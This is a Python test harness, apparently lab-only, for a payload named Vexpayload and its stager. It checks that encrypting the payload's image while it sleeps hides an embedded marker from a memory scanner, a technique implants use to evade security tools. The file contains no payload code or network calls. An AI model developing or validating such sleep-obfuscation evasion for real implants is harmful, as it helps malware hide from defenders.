"""Dormant image obfuscation test (lab-only).

Runs the real payload's sleep harness twice: once with the helper-process
image encryption enabled, once as a plain sleep. While each process is asleep,
mem_scan.py counts the embedded marker. Encrypted sleep must show zero hits;
plain sleep must show at least one.
"""

import os
import subprocess
import sys
import tempfile
import time

ROOT = r"D:\Vexpayload"
EXE = os.path.join(ROOT, "x64", "Release", "Vexpayload.exe")
STAGER = os.path.join(ROOT, "x64", "Release", "stager.exe")
SCAN = os.path.join(ROOT, "tools", "mem_scan.py")
MARKER = "VEX_MEM_MARKER_9f3a7c"
CHECKS = []


def ok(name, cond, extra=""):
    CHECKS.append((name, bool(cond)))
    print(("PASS " if cond else "FAIL ") + name + ((" " + str(extra)) if extra else ""))


def run_case(crypt, stager=False):
    pidfile = os.path.join(tempfile.gettempdir(),
                           "vex_sleep_%s%s.pid" % ("crypt" if crypt else "plain",
                                                   "_stager" if stager else ""))
    try:
        os.unlink(pidfile)
    except OSError:
        pass
    if stager:
        # --no-elevate keeps the parent at the scanner's integrity level; the
        # helper child still runs at the loader's default elevation.
        cmd = [STAGER, "--no-elevate", "--sleep-crypt-ms", "12000",
               "--pid-out", pidfile]
        if crypt:
            cmd.insert(2, "--sleep-crypt")
    else:
        cmd = [EXE, "--sleep-crypt-ms", "12000", "--pid-out", pidfile]
        if crypt:
            cmd.insert(1, "--sleep-crypt")
    proc = subprocess.Popen(cmd, cwd=ROOT, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, text=True, encoding="utf-8", errors="replace")
    deadline = time.time() + 20
    pid = None
    while time.time() < deadline:
        if os.path.exists(pidfile):
            try:
                pid = int(open(pidfile).read().strip())
                break
            except (ValueError, OSError):
                pass
        if proc.poll() is not None:
            break
        time.sleep(0.1)
    if not pid:
        out = proc.communicate(timeout=10)[0]
        return None, out
    time.sleep(1.2)  # helper has suspended and scrambled by now
    hits = int(subprocess.check_output(
        [sys.executable, SCAN, str(pid), MARKER], text=True, encoding="utf-8", errors="replace").strip())
    out = proc.communicate(timeout=60)[0]
    try:
        os.unlink(pidfile)
    except OSError:
        pass
    return (hits, proc.returncode, out), ""


def main():
    if os.environ.get("VEX_ALLOW_PAYLOAD") != "1":
        print("set VEX_ALLOW_PAYLOAD=1 to run the payload harness")
        return 2
    crypt, err = run_case(True)
    ok("crypt harness starts", crypt is not None, err)
    if crypt:
        hits, rc, out = crypt
        ok("encrypted sleep hides marker", hits == 0, f"hits={hits}")
        ok("encrypted sleep wakes clean", rc == 0 and "crypt=1" in out,
           f"rc={rc} {out.strip()[:120]!r}")
    plain, err = run_case(False)
    ok("plain harness starts", plain is not None, err)
    if plain:
        hits, rc, out = plain
        ok("plain sleep exposes marker", hits >= 1, f"hits={hits}")
        ok("plain sleep exits", rc == 0, f"rc={rc}")
    stager, err = run_case(True, stager=True)
    ok("stager harness starts", stager is not None, err)
    if stager:
        hits, rc, out = stager
        ok("stager sleep hides marker", hits == 0, f"hits={hits}")
        ok("stager sleep exits", rc == 0, f"rc={rc}")
    return 0 if all(s for _, s in CHECKS) else 1


if __name__ == "__main__":
    rc = main()
    bad = [n for n, s in CHECKS if not s]
    print(f"\n{len(CHECKS) - len(bad)}/{len(CHECKS)} checks passed")
    sys.exit(rc)
